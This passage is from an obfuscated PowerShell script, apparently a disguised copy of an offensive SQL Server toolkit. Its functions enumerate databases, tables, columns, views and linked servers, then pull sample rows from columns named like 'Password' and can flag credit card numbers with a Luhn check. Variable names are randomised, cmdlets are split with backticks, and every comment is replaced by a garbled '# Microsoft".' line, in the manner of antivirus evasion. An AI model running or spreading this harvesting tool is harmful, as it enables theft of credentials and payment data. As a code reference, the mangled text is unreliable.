            $BoringLarge = "  USE $FileSheep;
                SELECT  '$HauntGusty' as [ComputerName],
                '$Instance' as [Instance],
                TABLE_CATALOG AS [DatabaseName],
                TABLE_SCHEMA AS [SchemaName],
                TABLE_NAME as [TableName],
                TABLE_TYPE as [TableType]
                FROM [$FileSheep].[INFORMATION_SCHEMA].[TABLES]
                $CloseGlow
            ORDER BY TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME"

            # Microsoft".
            $TradeSpicy = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

            # Microsoft".
            $UltraRate = $UltraRate + $TradeSpicy
        }
    }

    End
    {
        # Microsoft".
        $UltraRate
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLColumn
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$AjarInnate,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Table name.')]
        [string]$MuscleTeam,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter by exact column name.')]
        [string]$SlowMagic,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Column name using wildcards in search.  Supports comma seperated list.')]
        [string]$FileCellar,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$EggsBead,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $JadedSofa = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if($MuscleTeam)
        {
            $JarMarked = " and TABLE_NAME like '%$MuscleTeam%'"
        }
        else
        {
            $JarMarked = ''
        }

        # Microsoft".
        if($SlowMagic)
        {
            $RoundYard = " and column_name like '$SlowMagic'"
        }
        else
        {
            $RoundYard = ''
        }

        # Microsoft".
        if($FileCellar)
        {
            $TinyPour = " and column_name like '%$FileCellar%'"
        }
        else
        {
            $TinyPour = ''
        }

        # Microsoft".
        if($FileCellar)
        {
            $ShaveMint = $FileCellar.split(',')

            [int]$AwakeOrder = $ShaveMint.Count
            while ($AwakeOrder -gt 0)
            {
                $AwakeOrder = $AwakeOrder - 1
                $UnusedStew = $ShaveMint[$AwakeOrder]

                if($AwakeOrder -eq ($ShaveMint.Count -1))
                {
                    $TinyPour = "and column_name like '%$UnusedStew%'"
                }
                else
                {
                    $TinyPour = $TinyPour + " or column_name like '%$UnusedStew%'"
                }
            }
        }
    }

    Process
    {
        # Microsoft".

        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        if($EggsBead)
        {
            # Microsoft".
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate $AjarInnate -TownItch -EggsBead -RaggedQuill
        }
        else
        {
            # Microsoft".
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate $AjarInnate -TownItch -RaggedQuill
        }

        # Microsoft".
        $JugglePush |
        ForEach-Object -Process {
            # Microsoft".
            $FileSheep = $_.DatabaseName

            # Microsoft".
            $BoringLarge = "  USE $FileSheep;
                SELECT  '$HauntGusty' as [ComputerName],
                '$Instance' as [Instance],
                TABLE_CATALOG AS [DatabaseName],
                TABLE_SCHEMA AS [SchemaName],
                TABLE_NAME as [TableName],
                COLUMN_NAME as [ColumnName],
                DATA_TYPE as [ColumnDataType],
                CHARACTER_MAXIMUM_LENGTH as [ColumnMaxLength]
                FROM	[$FileSheep].[INFORMATION_SCHEMA].[COLUMNS] WHERE 1=1
                $TinyPour
                $RoundYard
                $JarMarked
            ORDER BY TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME"

            # Microsoft".
            $TradeSpicy = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill

            # Microsoft".
            $JadedSofa = $JadedSofa + $TradeSpicy
        }
    }

    End
    {
        # Microsoft".
        $JadedSofa
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Get-SQLColumnSampleData
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [switch]$CattleEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of records to sample.')]
        [int]$EnjoySnake = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Comma seperated list of keywords to search for.')]
        [string]$ShaveMint = 'Password',

        [Parameter(Mandatory = $false,
        HelpMessage = 'Database name to filter on.')]
        [string]$AjarInnate,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use Luhn formula to check if sample is a valid credit card.')]
        [switch]$NailPause,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$EggsBead,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $CanGaze = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $CanGaze.Columns.Add('ComputerName')
        $null = $CanGaze.Columns.Add('Instance')
        $null = $CanGaze.Columns.Add('Database')
        $null = $CanGaze.Columns.Add('Schema')
        $null = $CanGaze.Columns.Add('Table')
        $null = $CanGaze.Columns.Add('Column')
        $null = $CanGaze.Columns.Add('Sample')
        $null = $CanGaze.Columns.Add('RowCount')

        if($NailPause)
        {
            $null = $CanGaze.Columns.Add('IsCC')
        }
    }

    Process
    {
        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : CONNECTION FAILED"
            }
            Return
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : START SEARCH DATA BY COLUMN"
                Write-Verbose -Message "$Instance : - Connection Success."
                Write-Verbose -Message "$Instance : - Searching for column names that match criteria..."
            }

            if($EggsBead)
            {
                # Microsoft".
                $DrearyFaulty = Get-SQLColumn -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate $AjarInnate -FileCellar $ShaveMint -EggsBead -RaggedQuill
            }else
            {
                $DrearyFaulty = Get-SQLColumn -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate $AjarInnate -FileCellar $ShaveMint -RaggedQuill
            }
        }

        # Microsoft".
        if($DrearyFaulty)
        {
            # Microsoft".
            $DrearyFaulty|
            ForEach-Object -Process {
                $AuntMaid = $_.DatabaseName
                $AbackBed = $_.SchemaName
                $MassFast = $_.TableName
                $KittyPreach = $_.ColumnName
                $RejectCover = "[$AuntMaid].[$AbackBed].[$MassFast].[$KittyPreach]"
                $MindJumpy = "[$AuntMaid].[$AbackBed].[$MassFast]"
                $BoringLarge = "USE $AuntMaid; SELECT TOP $EnjoySnake [$KittyPreach] FROM $MindJumpy WHERE [$KittyPreach] is not null"
                $VestExtend = "USE $AuntMaid; SELECT count(CAST([$KittyPreach] as VARCHAR(200))) as NumRows FROM $MindJumpy WHERE [$KittyPreach] is not null"

                # Microsoft".
                if( -not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : - Column match: $RejectCover"
                    Write-Verbose -Message "$Instance : - Selecting $EnjoySnake rows of data sample from column $RejectCover."
                }

                # Microsoft".
                $GlueEarth = Get-SQLQuery -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BoringLarge $VestExtend -RaggedQuill | Select-Object -Property NumRows -ExpandProperty NumRows

                # Microsoft".
                Get-SQLQuery -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BoringLarge $BoringLarge -RaggedQuill |
                Select-Object -ExpandProperty $KittyPreach |
                ForEach-Object -Process {
                    if($NailPause)
                    {
                        # Microsoft".
                        $RayPlucky = 0
                        if([uint64]::TryParse($_,[ref]$RayPlucky))
                        {
                            $PumpInform = Test-IsLuhnValid $_ -ErrorAction SilentlyContinue
                        }
                        else
                        {
                            $PumpInform = 'False'
                        }

                        # Microsoft".
                        $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $AuntMaid, $AbackBed, $MassFast, $KittyPreach, $_, $GlueEarth, $PumpInform)
                    }
                    else
                    {
                        # Microsoft".
                        $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $AuntMaid, $AbackBed, $MassFast, $KittyPreach, $_, $GlueEarth)
                    }
                }
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : - No columns were found that matched the search."
            }
        }

        # Microsoft".
        if( -not $RaggedQuill)
        {
            Write-Verbose -Message "$Instance : END SEARCH DATA BY COLUMN"
        }
    }

    End
    {
        # Microsoft".
        if ( -not $CattleEnter)
        {
            Return $CanGaze
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Get-SQLColumnSampleDataThreaded
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$CattleEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of records to sample.')]
        [int]$EnjoySnake = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Comma seperated list of keywords to search for.')]
        [string]$ShaveMint = 'Password',

        [Parameter(Mandatory = $false,
        HelpMessage = 'Database name to filter on.')]
        [string]$AjarInnate,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$EggsBead,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use Luhn formula to check if sample is a valid credit card.')]
        [switch]$NailPause,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$ItchyJuice = 5,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $CanGaze = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $CanGaze.Columns.Add('ComputerName')
        $null = $CanGaze.Columns.Add('Instance')
        $null = $CanGaze.Columns.Add('Database')
        $null = $CanGaze.Columns.Add('Schema')
        $null = $CanGaze.Columns.Add('Table')
        $null = $CanGaze.Columns.Add('Column')
        $null = $CanGaze.Columns.Add('Sample')
        $null = $CanGaze.Columns.Add('RowCount')

        if($NailPause)
        {
            $null = $CanGaze.Columns.Add('IsCC')
        }

        # Microsoft".
        $TinyHealth = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        if($Instance)
        {
            $BeefSpy = ne`w`-ob`je`ct -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Microsoft".
        $TinyHealth = $TinyHealth + $BeefSpy
    }

    Process
    {
        # Microsoft".
        $TinyHealth = $TinyHealth + $_
    }

    End
    {
        # Microsoft".
        $SecondElite = {
            # Microsoft".
            $Instance = $_.Instance

            # Microsoft".
            $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

            # Microsoft".
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }

            # Microsoft".
            $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
                $_.Status -eq 'Accessible'
            }
            if(-not $HoneyHusky)
            {
                if( -not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : CONNECTION FAILED"
                }
                Return
            }
            else
            {
                if( -not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : START SEARCH DATA BY COLUMN"
                    Write-Verbose -Message "$Instance : - Connection Success."
                    Write-Verbose -Message "$Instance : - Searching for column names that match criteria..."
                }

                if($EggsBead)
                {
                    # Microsoft".
                    $DrearyFaulty = Get-SQLColumn -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate $AjarInnate -FileCellar $ShaveMint -EggsBead -RaggedQuill
                }else
                {
                    $DrearyFaulty = Get-SQLColumn -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate $AjarInnate -FileCellar $ShaveMint -RaggedQuill
                }
            }

            # Microsoft".
            if($DrearyFaulty)
            {
                # Microsoft".
                $DrearyFaulty|
                ForEach-Object -Process {
                    $AuntMaid = $_.DatabaseName
                    $AbackBed = $_.SchemaName
                    $MassFast = $_.TableName
                    $KittyPreach = $_.ColumnName
                    $RejectCover = "[$AuntMaid].[$AbackBed].[$MassFast].[$KittyPreach]"
                    $MindJumpy = "[$AuntMaid].[$AbackBed].[$MassFast]"
                    $BoringLarge = "USE $AuntMaid; SELECT TOP $EnjoySnake [$KittyPreach] FROM $MindJumpy WHERE [$KittyPreach] is not null"
                    $VestExtend = "USE $AuntMaid; SELECT count(CAST([$KittyPreach] as VARCHAR(200))) as NumRows FROM $MindJumpy WHERE [$KittyPreach] is not null"

                    # Microsoft".
                    if( -not $RaggedQuill)
                    {
                        Write-Verbose -Message "$Instance : - Column match: $RejectCover"
                        Write-Verbose -Message "$Instance : - Selecting $EnjoySnake rows of data sample from column $RejectCover."
                    }

                    # Microsoft".
                    $GlueEarth = Get-SQLQuery -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BoringLarge $VestExtend -RaggedQuill | Select-Object -Property NumRows -ExpandProperty NumRows

                    # Microsoft".
                    Get-SQLQuery -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BoringLarge $BoringLarge -RaggedQuill |
                    Select-Object -ExpandProperty $KittyPreach |
                    ForEach-Object -Process {
                        if($NailPause)
                        {
                            # Microsoft".
                            $RayPlucky = 0
                            if([uint64]::TryParse($_,[ref]$RayPlucky))
                            {
                                $PumpInform = Test-IsLuhnValid $_ -ErrorAction SilentlyContinue
                            }
                            else
                            {
                                $PumpInform = 'False'
                            }

                            # Microsoft".
                            $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $AuntMaid, $AbackBed, $MassFast, $KittyPreach, $_, $GlueEarth, $PumpInform)
                        }
                        else
                        {
                            # Microsoft".
                            $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $AuntMaid, $AbackBed, $MassFast, $KittyPreach, $_, $GlueEarth)
                        }
                    }
                }
            }
            else
            {
                if( -not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : - No columns were found that matched the search."
                }
            }

            # Microsoft".
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : END SEARCH DATA BY COLUMN"
            }
        }

        # Microsoft".
        $TinyHealth | Invoke-Parallel -PlacidSleet $SecondElite -MateEasy -RhymeCoach -RouteWink $ItchyJuice -ShirtStory 2 -MassHope -ErrorAction SilentlyContinue

        return $CanGaze
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLDatabaseSchema
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$AjarInnate,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Schema name.')]
        [string]$BrakeFlavor,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$EggsBead,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $WhiteNeed = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if($BrakeFlavor)
        {
            $PlantCheap = " where schema_name like '%$BrakeFlavor%'"
        }
        else
        {
            $PlantCheap = ''
        }
    }

    Process
    {
        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        if($EggsBead)
        {
            # Microsoft".
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate $AjarInnate -TownItch -EggsBead -RaggedQuill
        }
        else
        {
            # Microsoft".
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate $AjarInnate -TownItch -RaggedQuill
        }

        # Microsoft".
        $JugglePush |
        ForEach-Object -Process {
            # Microsoft".
            $FileSheep = $_.DatabaseName

            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Grabbing Schemas from the $FileSheep database..."
            }

            # Microsoft".
            $BoringLarge = "  USE $FileSheep;
                SELECT  '$HauntGusty' as [ComputerName],
                '$Instance' as [Instance],
                CATALOG_NAME as [DatabaseName],
                SCHEMA_NAME as [SchemaName],
                SCHEMA_OWNER as [SchemaOwner]
                FROM    [$FileSheep].[INFORMATION_SCHEMA].[SCHEMATA]
                $PlantCheap
            ORDER BY SCHEMA_NAME"

            # Microsoft".
            $TradeSpicy = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill

            # Microsoft".
            $WhiteNeed = $WhiteNeed + $TradeSpicy
        }
    }

    End
    {
        # Microsoft".
        $WhiteNeed
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLView
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$AjarInnate,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'View name.')]
        [string]$NastyWink,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$EggsBead,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $ShaveFish = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if($NastyWink)
        {
            $HollowStare = " where table_name like '%$NastyWink%'"
        }
        else
        {
            $HollowStare = ''
        }
    }

    Process
    {
        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Grabbing views from the databases below:"
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        if($EggsBead)
        {
            # Microsoft".
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate $AjarInnate -TownItch -EggsBead -RaggedQuill
        }
        else
        {
            # Microsoft".
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate $AjarInnate -TownItch -RaggedQuill
        }

        # Microsoft".
        $JugglePush |
        ForEach-Object -Process {
            # Microsoft".
            $FileSheep = $_.DatabaseName

            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : - $FileSheep"
            }

            # Microsoft".
            $BoringLarge = "  USE $FileSheep;
                SELECT  '$HauntGusty' as [ComputerName],
                '$Instance' as [Instance],
                TABLE_CATALOG as [DatabaseName],
                TABLE_SCHEMA as [SchemaName],
                TABLE_NAME as [ViewName],
                VIEW_DEFINITION as [ViewDefinition],
                IS_UPDATABLE as [IsUpdatable],
                CHECK_OPTION as [CheckOption]
                FROM    [INFORMATION_SCHEMA].[VIEWS]
                $HollowStare
            ORDER BY TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME"

            # Microsoft".
            $TradeSpicy = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

            # Microsoft".
            $ShaveFish = $ShaveFish + $TradeSpicy
        }
    }

    End
    {
        # Microsoft".
        $ShaveFish
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLServerLink
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server link name.')]
        [string]$ServeLewd,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $ParcelOne = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if($ServeLewd)
        {
            $MeanUnique = " WHERE a.name like '$ServeLewd'"
        }
        else
        {
            $GateSleet = ''
        }
    }

    Process
    {
        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        $BoringLarge = "  SELECT  '$HauntGusty' as [ComputerName],
            '$Instance' as [Instance],
            a.server_id as [DatabaseLinkId],
            a.name AS [DatabaseLinkName],
            CASE a.Server_id
            WHEN 0
            THEN 'Local'
            ELSE 'Remote'
            END AS [DatabaseLinkLocation],
            a.product as [Product],
            a.provider as [Provider],
            a.catalog as [Catalog],
            'LocalLogin' = CASE b.uses_self_credential
            WHEN 1 THEN 'Uses Self Credentials'
            ELSE c.name
            END,
            b.remote_name AS [RemoteLoginName],
            a.is_rpc_out_enabled,
            a.is_data_access_enabled,
            a.modify_date
            FROM [Master].[sys].[Servers] a
            LEFT JOIN [Master].[sys].[linked_logins] b
            ON a.server_id = b.server_id
            LEFT JOIN [Master].[sys].[server_principals] c
            ON c.principal_id = b.local_principal_id
        $GateSleet"

        # Microsoft".
        $TradeSpicy = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

        # Microsoft".
        $ParcelOne = $ParcelOne + $TradeSpicy
    }

    End
    {
        # Microsoft".
        $ParcelOne
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLServerConfiguration
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Nubmer of hosts to query at one time.')]
        [int]$ItchyJuice = 5,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )
    Begin
    {
        # Microsoft".
